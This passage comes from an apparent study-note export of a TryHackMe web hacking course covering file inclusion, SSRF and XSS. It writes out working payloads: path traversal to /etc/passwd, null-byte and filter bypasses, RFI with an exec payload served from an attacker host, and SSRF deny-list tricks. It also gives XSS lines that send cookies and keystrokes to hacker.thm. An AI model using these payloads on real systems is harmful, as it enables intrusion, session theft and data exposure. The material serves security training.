AR</p><pre id="3bfe4375-bb87-4dbc-bea2-45d8b02d3674" class="code code-wrap"><code>&lt;?PHP
+	include($_GET[&quot;lang&quot;]);
+?&gt;</code></pre><p id="8e8171db-4dda-4c49-8ac3-007fa24d1147" class="">The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.</p><p id="7731685b-fadb-446b-a6f4-a30d1b35cd12" class="">Theoretically, we can access and display any readable file on the server from the code above if there isn&#x27;t any input validation. Let&#x27;s say we want to read the <strong><code>/etc/passwd</code></strong> file, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?file=/etc/passwd</p><p id="5236d8aa-fdcc-4834-bc6d-592f1af11846" class="">In this case, it works because there isn&#x27;t a directory specified in the include function and no input validation.</p><h3 id="8e0ded92-debb-4c78-ae9a-689c1a4738c5" class="">2. <code>Including: ../../../../etc/passwd</code></h3><p id="9b337cc2-40cb-4340-b953-be5d60b6139f" class="">Next, In the following code, the developer decided to specify the directory inside the function.</p><pre id="c953aefb-9412-4fdf-80d0-b7f3bc6446c9" class="code code-wrap"><code>&lt;?PHP
+	include(&quot;languages/&quot;. $_GET[&#x27;lang&#x27;]);
+?&gt;</code></pre><p id="1dd4baea-f16b-42ea-bebb-064de1db9757" class="">In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.</p><p id="674ca063-0fc7-4928-92fa-a5105dcea32c" class="">If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.</p><p id="e6f95622-3e1b-457b-a0bd-d5dcf4b048b5" class="">Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:</p><p id="9cc51eca-e586-4fe7-bd06-bbc259861171" class=""><code>http://webapp.thm/index.php</code><mark class="highlight-red"><strong><code>?lang=../../../../etc/passwd</code></strong></mark>.</p><h3 id="652e516e-1841-4794-b8ce-580202f22cbd" class="">3. <code>Including: /etc/passwd</code><mark class="highlight-red"><strong><code>%00</code></strong></mark></h3><ol type="1" id="e0d1e3ee-ac25-4ece-90bb-05b2a538cbc5" class="numbered-list" start="3"><li>In other cases may you can find your input followed by some extention like(<strong>.php</strong>):</li></ol><pre id="7f725445-3c97-4747-817d-c3f1abd1e63c" class="code code-wrap"><code>Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12</code></pre><p id="324985a7-8d07-46e2-bb47-e79bafe71bad" class="">It seems we could move out of the PHP directory but still, the include function reads the input with <mark class="highlight-red"><strong>.php</strong></mark> at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is <strong><code>%00</code></strong>.</p><p id="f840d5d4-b70c-471c-b7e5-527b4e193658" class="">Using null bytes is an injection technique where <strong>URL-encoded representation</strong> such as <code><strong>%00</strong></code> or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding wh,atever comes after the Null Byte.</p><p id="5dad613e-be87-4fdc-a2ae-912210f877ee" class="">*Note: We set the <strong><code>%00</code></strong><strong> </strong>in the URL. → <code>http://webapp.thm/index.php</code><mark class="highlight-red"><code><strong>?lang=/etc/passw%00</strong></code></mark>.</p><h3 id="ea4dd23e-5a08-4bcd-a483-dc4026e6a396" class="">4. <code>Including: /etc/passwd</code><mark class="highlight-red"><strong><code>/.</code></strong></mark></h3><p id="e717923b-17cb-4410-b372-2d9bd864596d" class="">In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte <strong><code>%00</code></strong> or the current directory trick at the end of the filtered keyword <code><strong>/.</strong></code>. The exploit will be similar to <code>http://webapp.thm/index.php</code><mark class="highlight-red"><strong><code>?lang=/etc/passwd/.</code></strong></mark>We could also use <code>http://webapp.thm/index.php</code><mark class="highlight-red"><code><strong>?lang=/etc/passwd</strong></code></mark>.</p><p id="d518dcca-45e0-407f-9197-17b9a8fc78fa" class="">Remember: <strong><code>cd ..</code></strong> → Previous Directory.    <code><strong>cd .</strong></code> → Current Directory.</p><h3 id="19e97fd9-b50a-45de-ac83-0d12f2c273b5" class="">5. <code>Including: </code><mark class="highlight-red"><strong><code>....//....//....//....//....//etc/passwd</code></strong></mark></h3><p id="3a1dc9cc-961b-4694-8ca6-770a34602ef4" class="">Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let&#x27;s test out and check the error message!</p><p id="0ca417cb-248b-4f16-a4a5-391dcc64be19" class=""><code>http://webapp.thm/index.php</code><strong><mark class="highlight-red"><code>?lang=../../../../etc/passwd</code></mark></strong></p><p id="964ee204-dff2-44f5-b1db-0519795e3cec" class="">We got the following error!</p><pre id="f0bd5112-c026-4cef-943b-6ffc722cfeb2" class="code code-wrap"><code>Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15</code></pre><p id="593584e4-2f9b-4a3b-92cb-3bbec5899b18" class="">If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the <code>../</code> with the empty string. There are a couple of techniques we can use to bypass this.</p><p id="1d6ef253-f93d-42b7-8e66-c4e2604a8940" class="">First, we can send the following payload to bypass it: <code><strong>....//....//....//....//....//etc/passwd</strong></code></p><figure id="bbdb450c-ce76-46f4-a40c-584d1a52d337" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png"/></a></figure><p id="d28135f3-7fd1-4623-a922-07ba6dd4641a" class="">Injection → <code>http://webapp.thm/index.php</code><mark class="highlight-red"><strong><code>?lang=....//....//....//....//....//etc/passwd</code></strong></mark></p><h3 id="117993f1-4aa5-4449-a016-522ea83273c6" class="">6. <code>Including: </code><mark class="highlight-red"><strong><code>directory/</code></strong></mark><code>../../../../etc/passwd</code></h3><p id="12ed34c6-5cc0-4bc1-b3fd-6dff2982a478" class="">Finally, we&#x27;ll discuss the case where the developer forces the include to read from a defined directory! </p><p id="50beb31a-4783-4a94-90a0-94b15c7d6dd6" class="">For example, if the web application asks to supply input that has to include a directory such as: <code>http://webapp.thm/index.php?lang=languages/EN.php</code> then, to exploit this, we need to include the directory in the payload like so: <code>?lang=</code><mark class="highlight-red"><span style="border-bottom:0.05em solid"><strong><code>languages/../</code></strong></span></mark><code>../../../../etc/passwd</code>.</p><p id="7a23744d-0baf-4c31-a943-d841b3ec1b52" class="">(We included the directory we must include)</p><h2 id="910bb893-9d16-4d3f-9a2a-c4ccb1441a2d" class=""><mark class="highlight-blue">RFI - Remote File Inclusion</mark></h2><p id="ded003fb-cb27-433c-a664-b938fe8d93d1" class="">Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.</p><p id="b1fdcc57-057b-4703-979c-ad7eece059ec" class="">The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Code Execution (RCE) on the server. Other consequences of a successful RFI attack include:</p><ul id="acdf2888-ba09-4643-9a3a-90d0491d600c" class="bulleted-list"><li style="list-style-type:disc">Sensitive Information Disclosure</li></ul><ul id="25ddc41b-a4c6-4705-97b0-981fab9c5d41" class="bulleted-list"><li style="list-style-type:disc">Cross-site Scripting (XSS)</li></ul><ul id="c6bc43ef-10e8-4876-9472-f9490fffbab3" class="bulleted-list"><li style="list-style-type:disc">Denial of Service (DoS)</li></ul><p id="c623d76c-23bd-42f3-83db-29a95f8a9383" class="">An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.</p><figure id="b140cca8-671c-4afd-bed1-3ebdc85461e1" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png"/></a></figure><h3 id="07367017-661a-483b-8b3b-c9c41408b59c" class="">RFI steps</h3><p id="448322ff-60dd-4537-8cb3-2c06ba63e2cd" class="">The following figure is an example of steps for a successful RFI attack! Let&#x27;s say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.</p><pre id="200e9b73-317d-4f8b-842e-6d19be984c24" class="code code-wrap"><code>&lt;?PHP echo &quot;Hello THM&quot;; ?&gt;</code></pre><p id="d63aee00-55ef-4809-acc7-8855af49b456" class="">First, the attacker injects the malicious URL, which points to the attacker&#x27;s server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.</p><h3 id="589f81de-c313-4676-9436-b008f21d5fa9" class="">RFI Example\ Execute ‘hostname’ command on the server shell:</h3><p id="03bee510-0556-4087-964c-280c1d744c2d" class="">Required: Run the code ‘hostname’ on the web-applicatoin’s server and get the result.</p><ol type="1" id="999c3de6-9dc2-4be9-bb7b-92802e4895b0" class="numbered-list" start="1"><li><strong>Prepare the code → cmd.txt</strong></li></ol><p id="734eac12-99ea-4152-b232-905cc7911289" class="">PHP code run commands and returning the result:</p><pre id="c15f1664-89d4-4383-ad16-be447727f064" class="code"><code>&lt;?php
+print exec(&#x27;hostname&#x27;);
+?&gt;</code></pre><p id="26a20c1d-a964-44a7-922c-53ba393b3ee4" class="">print: return shell’s result    exec: run the code()</p><ol type="1" id="7e57648a-4eb6-49a4-a7c2-11b95996e80e" class="numbered-list" start="2"><li><strong>Run HTTP server</strong></li></ol><p id="1fc722ed-7f98-4cbe-b5d0-fb4604d6cc6f" class="">run: <strong><code>python -m http.server —directory  [where ‘cmd.txt’ existing] —bind [domain] [port]</code></strong></p><ol type="1" id="1b203d6b-fcf8-4a97-b78b-a80880a67d7f" class="numbered-list" start="3"><li><strong>Inject our server URL</strong></li></ol><p id="6ddc201c-8f3e-4fc8-bd94-b81a3243002e" class="">http://example.com?file=http://domain:port/cmd.txt</p><h2 id="df72f688-2ec7-42f8-bd89-40bc713c4ebc" class=""><mark class="highlight-blue">Remediation</mark></h2><p id="2c80b400-f477-478a-ab8c-c6488eafd13d" class="">As a developer, it&#x27;s important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:</p><ol type="1" id="4891ce53-22b3-4029-9b21-c0782315bbde" class="numbered-list" start="1"><li>Keep system and services, including web application frameworks, updated with the latest version.</li></ol><ol type="1" id="b6e68fef-97d2-45e8-ab80-13a8d10ab3f5" class="numbered-list" start="2"><li>Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.</li></ol><ol type="1" id="9a916d76-359f-4008-b6fd-587ad71bbc69" class="numbered-list" start="3"><li>A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.</li></ol><ol type="1" id="573ed3ba-842c-4e88-8e0e-ea014af7c5aa" class="numbered-list" start="4"><li>Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn&#x27;t need them, such as allow_url_fopen on and allow_url_include.</li></ol><ol type="1" id="44b9d282-fe5e-4ec0-b75f-3475cf2043a3" class="numbered-list" start="5"><li>Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.</li></ol><ol type="1" id="3b58f845-eecc-43f3-b5e6-d67826ac78da" class="numbered-list" start="6"><li>Never trust user input, and make sure to implement proper input validation against file inclusion.</li></ol><ol type="1" id="a774e094-7850-46dc-acf9-80436b398804" class="numbered-list" start="7"><li>Implement whitelisting for file names and locations as well as blacklisting.</li></ol><h2 id="5fce6432-b85a-48b9-a406-bd1db00725f0" class=""><mark class="highlight-blue">Sometimes</mark> <mark class="highlight-blue">you need to try:</mark></h2><ul id="b93d294c-34ee-4feb-affa-7dcef4182774" class="bulleted-list"><li style="list-style-type:disc">Convert the HTTP Method from <strong><code>GET</code></strong><strong> </strong>to <code><mark class="highlight-red"><strong>POST</strong></mark></code> request. may you bypass the filters.</li></ul><ul id="34798d60-464c-415f-b10d-589f55856238" class="bulleted-list"><li style="list-style-type:disc">Don’t limit the Traversal in the URL only, search in other places, maybe in the <span style="border-bottom:0.05em solid"><strong>header</strong></span> or <strong>cookie</strong>!</li></ul><p id="d590925d-5582-47bc-9519-f729f466daf7" class="">#3 → GET → POST using HTML, render by BurpSutie and add “%00” in the finish. [Keep watching the filters]</p><ul id="7c9904b9-205e-4bcb-af15-c336faab0275" class="bulleted-list"><li style="list-style-type:disc">Use every Way? don’t forget to use more than way together, often you need to bypass several challenges. like <code>GET</code> → <code><strong>POST</strong></code><strong> </strong>and set<strong> </strong><code><strong>%00</strong></code><strong> </strong>in the parameters(end) of the POST request.</li></ul><ul id="5e22bf17-2219-4906-99dc-be807ad723f8" class="bulleted-list"><li style="list-style-type:disc">Why not using some tools like <mark class="highlight-orange"><span style="border-bottom:0.05em solid"><strong>BurpSuite</strong></span></mark><strong>.</strong></li></ul><h1 id="7aa6815e-d2c8-415a-9cb7-1fd8fe0c82dc" class=""><em><mark class="highlight-yellow_background">SSRF (Server-Side Request Forgery)</mark></em></h1><p id="e5186a91-fa0c-4c53-8d7e-0d75ecfed375" class="">It&#x27;s a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker&#x27;s choosing.</p><h3 id="b1025991-9bac-4667-a4a1-6c270260411f" class="">Types of SSRF</h3><p id="f1ea6b56-49b1-4339-94b5-fe7e4c6433c0" class="">There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker&#x27;s screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker&#x27;s screen.</p><h3 id="2ce2c672-c7ef-4b17-8bf3-bd08e7a0a7c8" class="">What&#x27;s the impact?</h3><p id="91a2ae0c-edde-4db6-b230-fa0c998f27a6" class="">A successful SSRF attack can result in any of the following:</p><ul id="a42a4eae-2c60-4799-bf37-782b79206b07" class="bulleted-list"><li style="list-style-type:disc">Access to unauthorised areas.</li></ul><ul id="1a0a368f-4238-4c08-a48b-042ddd42dae4" class="bulleted-list"><li style="list-style-type:disc">Access to customer/organisational data.</li></ul><ul id="21c18fb4-4498-4ed3-882d-e25c5a62a73b" class="bulleted-list"><li style="list-style-type:disc">Ability to Scale to internal networks.</li></ul><ul id="c6fa2080-4f64-4e3e-8d6c-beae83883b81" class="bulleted-list"><li style="list-style-type:disc">Reveal authentication tokens/credentials.</li></ul><div id="98ffc29f-221e-4599-b4f2-159e10dd5585" class="collection-content"><h4 class="collection-title">SSRF Examples</h4><table class="collection-content"><thead><tr><th><span class="icon property-icon"><svg viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesTitle"><path d="M0.637695 13.1914C1.0957 13.1914 1.32812 13 1.47852 12.5215L2.24414 10.3887H6.14746L6.90625 12.5215C7.05664 13 7.2959 13.1914 7.74707 13.1914C8.22559 13.1914 8.5332 12.9043 8.5332 12.4531C8.5332 12.2891 8.50586 12.1523 8.44434 11.9678L5.41602 3.79199C5.2041 3.21777 4.82129 2.9375 4.19922 2.9375C3.60449 2.9375 3.21484 3.21777 3.0166 3.78516L-0.0322266 12.002C-0.09375 12.1797 -0.121094 12.3232 -0.121094 12.4668C-0.121094 12.918 0.166016 13.1914 0.637695 13.1914ZM2.63379 9.12402L4.17871 4.68066H4.21973L5.76465 9.12402H2.63379ZM12.2793 13.2324C13.3115 13.2324 14.2891 12.6787 14.7129 11.8037H14.7402V12.5762C14.7471 12.9863 15.0273 13.2393 15.4238 13.2393C15.834 13.2393 16.1143 12.9795 16.1143 12.5215V8.00977C16.1143 6.49902 14.9658 5.52148 13.1543 5.52148C11.7666 5.52148 10.6592 6.08887 10.2695 6.99121C10.1943 7.15527 10.1533 7.3125 10.1533 7.46289C10.1533 7.81152 10.4062 8.04395 10.7686 8.04395C11.0215 8.04395 11.2129 7.94824 11.3496 7.73633C11.7529 6.99121 12.2861 6.65625 13.1064 6.65625C14.0977 6.65625 14.6992 7.20996 14.6992 8.1123V8.67285L12.5664 8.7959C10.7686 8.8916 9.77734 9.69824 9.77734 11.0107C9.77734 12.3369 10.8096 13.2324 12.2793 13.2324ZM12.6621 12.1387C11.8008 12.1387 11.2129 11.667 11.2129 10.9561C11.2129 10.2725 11.7598 9.82129 12.7578 9.75977L14.6992 9.62988V10.3203C14.6992 11.3457 13.7969 12.1387 12.6621 12.1387Z"></path></svg></span>Name</th></tr></thead><tbody><tr id="8ed5ea74-7595-442b-a7b5-4100606cfc8c"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SSRF%20Examples%2098ffc29f221e4599b4f2159e10dd5585/1%20SSRF%20Example%208ed5ea747595442ba7b54100606cfc8c.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/268e10b8ee0b53d1074b2a7fd5b1a789.png"/>1. SSRF Example</a></td></tr><tr id="67ae219f-0fc5-4a54-acf9-f00728468386"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SSRF%20Examples%2098ffc29f221e4599b4f2159e10dd5585/2%20SSRF%20Example%2067ae219f0fc54a54acf9f00728468386.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/268e10b8ee0b53d1074b2a7fd5b1a789.png"/>2. SSRF Example</a></td></tr><tr id="c8dfa91c-bf99-4031-8dc1-fc8e26ec1bbb"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SSRF%20Examples%2098ffc29f221e4599b4f2159e10dd5585/3%20SSRF%20Example%60%20c8dfa91cbf9940318dc1fc8e26ec1bbb.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/268e10b8ee0b53d1074b2a7fd5b1a789.png"/>3. SSRF Example`</a></td></tr><tr id="2eeca5d1-9888-456a-b801-8b8d175f95ff"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SSRF%20Examples%2098ffc29f221e4599b4f2159e10dd5585/4%20SSRF%20Example%202eeca5d19888456ab8018b8d175f95ff.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/268e10b8ee0b53d1074b2a7fd5b1a789.png"/>4. SSRF Example</a></td></tr><tr id="f6632bbf-9adb-4a33-b452-902d39bdd671"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SSRF%20Examples%2098ffc29f221e4599b4f2159e10dd5585/5%20SSRF%20Example%20f6632bbf9adb4a33b452902d39bdd671.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/268e10b8ee0b53d1074b2a7fd5b1a789.png"/>5. SSRF Example</a></td></tr><tr id="d584226c-330d-4c3f-b62f-2b2587faea0b"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SSRF%20Examples%2098ffc29f221e4599b4f2159e10dd5585/SSRF%20Practical%20Example%20d584226c330d4c3fb62f2b2587faea0b.html">SSRF Practical Example</a></td></tr></tbody></table></div><h2 id="c0da3e5b-31f6-4f7c-97dc-41fd0c4914a5" class=""><mark class="highlight-blue">Finding an SSRF</mark></h2><p id="072bb193-3c2c-44be-b854-d9be7ec821c8" class="">Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look,</p><h3 id="4904cb55-0472-4e77-a57b-1ff8411e8ba4" class="">When a full URL is used in a parameter in the address bar:</h3><figure id="e7e23f82-1537-406e-ad06-89bb84b8e3dc" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png"/></a></figure><h3 id="bebc98f2-fc15-40cf-a7c1-07a96b46aab0" class="">A hidden field in a form:</h3><figure id="a4491655-3b24-435f-859a-fce5ae3601df" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png"/></a></figure><h3 id="3d71c3d8-20cc-4103-af6d-2c9688a59ee8" class="">A partial URL such as just the hostname:</h3><figure id="054db56c-070b-4b50-a290-0f9051c4c614" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png"/></a></figure><h3 id="d793fd28-17f9-4d47-b2ff-8ccfd3a1b379" class="">Or perhaps only the path of the URL:</h3><figure id="e4c2438c-1a70-41b2-9821-67b3efe7a169" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png"/></a></figure><p id="ef874777-211e-4df9-9323-787aed5cb4a9" class="">If working with a blind SSRF where no output is reflected back to you, you&#x27;ll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or <strong>Burp Suite</strong>&#x27;s Collaborator client.</p><h2 id="f6e29b48-8814-4015-83a0-f9441e3d117a" class=""><mark class="highlight-blue">Defeating Common SSRF Defenses</mark></h2><h3 id="00531fb2-9cee-4833-b3a9-8fc4504f6f58" class="">Deny List </h3><p id="ea6f9e70-1edf-40af-b67b-9da1611e9c2f" class="">Is where all requests are accepted apart from resources specified in a list or matching a particular pattern. A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrict access is the localhost, which may contain server performance data or further sensitive information.</p><p id="1bdbc074-0dbc-44ee-8623-323691b7fd1f" class="">In a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254, this IP specific to a instance. It can only be accessed locally from instances and available without encryption and authentication.</p><h3 id="878c09f1-08d7-428a-b9d3-0733e2b6ea5d" class="">Allow List</h3><p id="d75e9628-a033-40ce-abde-3d4a5828abb8" class="">Is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with <strong>https://website.thm.</strong> An attacker could quickly circumvent this rule by creating a subdomain on an attacker&#x27;s domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.</p><h3 id="16fd787d-3256-4f2c-b7d8-222b7e7bb99b" class="">Open Redirect</h3><p id="930ef3dd-b6a7-4d41-87f1-8f5ed1868b04" class="">If the above bypasses do not work, there is one more trick up the attacker&#x27;s sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address.</p><h1 id="37967981-9f8e-4e50-af07-629db0119a63" class=""><em><mark class="highlight-yellow_background">XSS - Cross-site Scripting</mark></em></h1><p id="03d5a6f9-ef5b-4c6c-abd0-c6a21c94dc95" class="">Injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.</p><p id="c26c6ccd-3eeb-4b84-be30-bcd771a5a605" class="">In XSS, the <mark class="highlight-blue">payload </mark>is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.</p><p id="9637a44b-f374-4dad-8359-6694f8351294" class=""><mark class="highlight-blue"><strong>Proof Of Concept:</strong></mark></p><p id="c3c4bc5a-067c-44ef-a377-9840204cc59c" class="">This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:</p><p id="13c38a77-0f18-4a03-95ba-d9d94a32fa17" class=""><mark class="highlight-red"><strong><code>&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</code></strong></mark></p><p id="ef583a3c-adba-4341-9b7d-56885485f205" class=""><mark class="highlight-blue">Some of other XSS payloads:</mark></p><p id="dcc2a544-683e-41d4-9466-42c054f27ee0" class=""><strong>Session Stealing: </strong><strong><code>&lt;script&gt;fetch(&#x27;https://hacker.thm/steal?cookie=&#x27; + btoa(document.cookie));&lt;/script&gt;</code></strong></p><p id="ba3b8fd2-d453-46ab-b92d-9dadd7cf1d8a" class=""><strong>Key Logger: </strong><strong><code>&lt;script&gt;document.onkeypress = function(e) { fetch(&#x27;https://hacker.thm/log?key=&#x27; + btoa(e.key) );}&lt;/script&gt;</code></strong></p><p id="4549bc7e-16ce-4a07-9950-bce7dc585870" class=""><strong>Business Logic: </strong><code><strong>&lt;script&gt;user.changeEmail(&#x27;attacker@hacker.thm&#x27;);&lt;/script&gt;</strong></code></p><h1 id="120cfb68-51d9-4dc3-8413-61d7dbde2b5f" class=""><mark class="highlight-blue">Reflected XSS</mark></h1><p id="dc1ff9fc-89de-434e-94f2-9332daafc831" class="">Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.</p><figure id="9e3ff28f-7126-4625-94a9-8dd3f18462a8" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png"/></a></figure><figure id="8fcc0bac-5287-40e6-9d01-30c575c4b68c" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png"/></a></figure><p id="e58bb0e5-0dfe-4b4b-8163-b4ba17b2c01b" class="">The application doesn&#x27;t check the contents of the <strong>error</strong> parameter, which allows the attacker to insert malicious code.</p><figure id="4c2964c1-5871-4db1-9161-d7db476e6d14" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66743e9fa50b4c5793f070eb505f72d1.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66743e9fa50b4c5793f070eb505f72d1.png"/></a></figure><figure id="acae47dd-db3f-466c-b714-aa5ccfbb4c9a" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24e50d95cecfc3783bd1a3a4fecbf310.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24e50d95cecfc3783bd1a3a4fecbf310.png"/></a></figure><p id="d05e0c95-b8b4-42e5-b8aa-87468ef3e569" class="">The vulnerability can be used as per the scenario in the image below:</p><figure id="f22f54b5-2a9f-40bd-abb6-9be35ebc7091" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png"/></a></figure><h3 id="c5bae24e-d2cd-46a0-86c4-fc58ce9bba33" class=""><strong>Potential Impact</strong>:</h3><p id="e7b39d64-3ce9-4c72-af08-7950978d2d27" class="">The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.</p><p id="8316f2b1-8195-4a32-8050-4b6bbc8ca70d" class=""><strong>How to test for Reflected XSS:</strong></p><p id="e5bd6d78-2181-41fd-955c-f7d5b5f2425d" class="">You&#x27;ll need to test every possible point of entry; these include:</p><ul id="81a1ba44-22f7-4f41-be62-052d431e8134" class="bulleted-list"><li style="list-style-type:disc">Parameters in the URL Query String</li></ul><ul id="b5effbc5-40c0-4826-8a44-0b69d8937a4f" class="bulleted-list"><li style="list-style-type:disc">URL File Path</li></ul><ul id="0ca65e31-01ae-41a2-9794-28e52a9f0511" class="bulleted-list"><li style="list-style-type:disc">Sometimes HTTP Headers (although unlikely exploitable in practice)</li></ul><h2 id="9e96d280-e2e8-42ca-a3f7-2168e01c8e86" class=""><mark class="highlight-blue"><strong>Stored XSS</strong></mark></h2><p id="25b77fd4-a7c6-443f-89ca-b819654dbf25" class=""><strong>Potential Impact:</strong>The malicious JavaScript could redirect users to another site, steal the user&#x27;s session cookie, or perform other website actions while acting as the visiting user.</p><p id="b45bf6ee-b4be-4ab8-947e-5efc648d6d75" class=""><strong>How to test for Stored XSS:</strong></p><p id="7e77ef68-e56d-4dcf-a5a5-405b283d9579" class="">You&#x27;ll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a 